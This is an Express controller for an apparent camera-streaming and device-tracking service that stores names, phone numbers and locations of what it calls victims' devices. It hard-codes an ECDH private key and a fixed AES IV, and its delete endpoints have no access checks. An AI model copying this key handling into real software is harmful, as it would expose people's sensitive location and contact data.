/**
 * Module dependencies.
 */
var mongoose = require('mongoose'),
    _ = require('underscore');
var Camara = require('../../app/models/camara');
var Historial = require('../../app/models/historial');
var StatusDevice = require('../../app/models/statusDevice');
var Utilities = require('./utilities');
var crypto = require('crypto');
var ecdh = require('ecdh');

var error = {'response' : 404};
var error_400 = {'response' : 400};
var error_400_1 = {'responseEO' : 400};
var ok = {'response' : 201};

var fs = require('fs');

var Encrypt;

Encrypt = (function() {

  // Pick some curve
  var curve = ecdh.getCurve('secp128r1'),
  // Generate random keys for Alice and Bob
  aliceKeys = ecdh.generateKeys(curve),
  bobKeys = ecdh.generateKeys(curve);

  var pub_android = new Buffer("G2YIoex+dKUX1nsMWmmraybgACjvR5dvlYg8BwKPWLw=", 'base64');
  var pri_android = new Buffer("dn+4hiljaIyNrvsdTlcAlw==", 'base64');

  var publica = ecdh.PublicKey.fromBuffer(curve, pub_android);
  var privada = ecdh.PrivateKey.fromBuffer(curve, pri_android);

  var comp = privada.deriveSharedSecret(publica);

  var cipher_desencriptar, cipher_encriptar, decrypt, encrypt, iv, key;
  key = crypto.createHash("sha256").update(comp.toString('hex')).digest();
  iv = '4e5Wa71fYoT7MFEX';

  cipher_desencriptar = function(mode, data) {
    var encipher, encoded;
    encipher = crypto[mode]("aes-256-cbc", key, iv);
    encoded = encipher.update(data,'base64','utf8');
    encoded += encipher.final('utf8');
    return encoded;
  };
  cipher_encriptar = function(mode, data) {
    var encipher, encoded;
    encipher = crypto[mode]("aes-256-cbc", key, iv);
    encoded = encipher.update(data,'utf8','base64');
    encoded += encipher.final('base64');
    return encoded;
  };
  encrypt = function(data) {
    return cipher_encriptar("createCipheriv", data);
  };
  decrypt = function(data) {
    return cipher_desencriptar("createDecipheriv", data);
  };
  return {
    encrypt: encrypt,
    decrypt: decrypt
  };
})();


/* Views Responce */
exports.index = function (req, res) {
    res.render('camaras');
};

exports.addindex = function (req, res) {
    res.render('add_camara');
};

exports.listindex = function (req, res) {
    res.render('list_camara');
};

exports.historialindex = function (req, res) {
    res.render('historial');
};

exports.estadoindex = function (req, res) {
    res.render('estado');
};


/************************************************************************************/
/*******    API Responces                                                  **********/
/************************************************************************************/

/* All cams */
exports.getall = function (request, response) {
    Camara.find(function (err, camaras) {
        if (!err) {
            response.send(camaras);
        } else {
            console.log(err);
            response.send(error);
        }
    });
};

/* Get historial */
exports.getHistorial = function (request, response) {
    Historial.find({}, null, {sort: {time: -1}},function (err, historiales) {
        if (!err) {
            response.send(historiales);
        } else {
            console.log(err);
            response.send(error);
        }
    });
};

/* Borrar historial de conexiones */
exports.deleteHistorial = function (request, response) {
  Historial.remove({}, function (err) { });
};

/* Get estado */
exports.getEstado = function (request, response) {
    // StatusDevice.find({mac: "12:12:12:12:12:12"}).exec(function (err, historiales) {
    //     if (err) return response.send(error);
    //
    //     var new_state = new StatusDevice({ mac: "14:14:13:13:11:22", name: "Jose", number: "666666666", latitude: "23,211122", longitude: "-12,123123", distance: 13, battery: "96%" });
    //     new_state.save();
    // });

    StatusDevice.find({}, null, {sort: {distance: -1}},function (err, estados) {
        if (!err) {
            response.send(estados);
        } else {
            console.log(err);
            response.send(error);
        }
    });
};

/* All cams */
exports.getalllive = function (request, response) {
    Camara.find({online : true}, function (err, camaras) {
        if (!err) {
            response.send(camaras);
        } else {
            console.log(err);
            response.send(error);
        }
    });
};

/* Delete */
exports.delete = function (request, response) {
    if ( Utilities.isEmpty(request.params.id)) return response.send(error_400);
    Camara.findOne({_id: request.params.id}, function (err, camara) {
        if (err) return response.send(error);
        if (Utilities.isEmpty(camara)) return response.send(error);
        camara.remove();
        response.send(ok);
    });
};

/* New camera */
exports.new = function (request, response) {

    // var src = 'me';
    // var enc = Encrypt.encrypt(src);
    // console.log('encrypted: ', enc);
    // var dec = Encrypt.decrypt(enc);
    // // var dec = Encrypt.decrypt('rh7ro9NH');
    // console.log('decrypted: ', dec);

    if ( Utilities.isEmpty(request.body.name)) return response.send(error_400);
    if ( Utilities.isEmpty(request.body.server)) return response.send(error_400);

    var Dname = Encrypt.decrypt(request.body.name);
    var Dserver = Encrypt.decrypt(request.body.server);

    Camara.find({name: Dname}).exec(function (err, camaras) {

        if (err) return response.send(error);
        if (!Utilities.isEmpty(camaras)) return response.send(error);

        var server = "rtmp://" + Dserver + Dname;
        var camaranueva = new Camara({ server: server, name: Dname});
        camaranueva.save();

        response.send(ok);
    });

};

/* ¿on Live? */
exports.getisonline = function (request, response) {
    if (Utilities.isEmpty(request.params.id)) return response.send(error_400);
    Camara.findOne({_id: request.params.id}, function (err, camara) {
        if (err) return response.send(error);
        if (Utilities.isEmpty(camara)) return response.send(error);
        response.send(camara.online);
    });
};

/* on Live */
exports.putonline = function (request, response) {

    if (Utilities.isEmpty(request.params.name)) return response.send(error_400);

    if (Utilities.isEmpty(request.body.name)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.server)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.time_now)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.latitude)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.longitude)) return response.send(error_400);

    var DTime_now = Encrypt.decrypt(request.body.time_now);
    var DNombre = Encrypt.decrypt(request.body.nombre);
    var DNumero = Encrypt.decrypt(request.body.numero);
    var DServer = Encrypt.decrypt(request.body.server);
    var DLatitude = Encrypt.decrypt(request.body.latitude);
    var DLongitude = Encrypt.decrypt(request.body.longitude);

    Camara.find({name: request.params.name}).exec(function (err, camara) {

        if (err) response.send(error_400);
        if (Utilities.isEmpty(camara)) return response.send(error_400);

        camara[0].online = true;
        camara[0].time_online = DTime_now;
        camara[0].number = DNumero;
        camara[0].nombre = DNombre;
        camara[0].latitude = DLatitude;
        camara[0].longitude = DLongitude;
        camara[0].save();

        Historial.find({name: request.params.name}).exec(function (err, historiales) {
            if (err) return response.send(error);

            var server = "rtmp://" + DServer + request.params.name;
            var historial_nuevo = new Historial({ name: request.params.name, nombre: DNombre, numero: DNumero, time: DTime_now, latitude: DLatitude, longitude: DLongitude });
            historial_nuevo.save();

            response.send(ok);
        });
    });
};

/* off Live  */
exports.putoffline = function (request, response) {
    if (Utilities.isEmpty(request.params.name)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.date_last_online)) return response.send(error_400);

    var DTime_now = Encrypt.decrypt(request.body.date_last_online);

    Camara.find({name: request.params.name}).exec(function (err, camara) {
        if (err) response.send(error_400);
        if (Utilities.isEmpty(camara)) return response.send(error_400);
        camara[0].online = false;
        camara[0].time_offline = DTime_now;
        camara[0].save();
        response.send(ok);
    });
};

/* update state of victim's devices */
exports.updateStateDevice = function (request, response) {

    if (Utilities.isEmpty(request.params.mac)) return response.send(error_400);

    if (Utilities.isEmpty(request.body.name)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.number)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.latitude)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.longitude)) return response.send(error_400);
    if (Utilities.isEmpty(request.body.battery)) return response.send(error_400);

    var DName = Encrypt.decrypt(request.body.name);
    var DNumber = Encrypt.decrypt(request.body.number);
    var DLatitude = Encrypt.decrypt(request.body.latitude);
    var DLongitude = Encrypt.decrypt(request.body.longitude);
    var DBattery = Encrypt.decrypt(request.body.battery);

    StatusDevice.find({mac: request.params.mac}).exec(function (err, device) {

        if (err) return response.send(error);

        // If it is empty, a new device will be saved on db
        if (Utilities.isEmpty(device)){
          var new_state = new StatusDevice({ mac: request.params.mac, name: DName, number: DNumber, latitude: DLatitude, longitude: DLongitude, distance: 0, battery: DBattery + "%" });
          new_state.save();

          response.send(ok);
        } else {
          device[0].name = DName;
          device[0].number = DNumber;
          device[0].latitude = DLatitude;
          device[0].longitude = DLongitude;
          device[0].distance = device[0].distance + 1;
          device[0].battery = DBattery;
          device[0].save();

          response.send(ok);
        }
    });
};
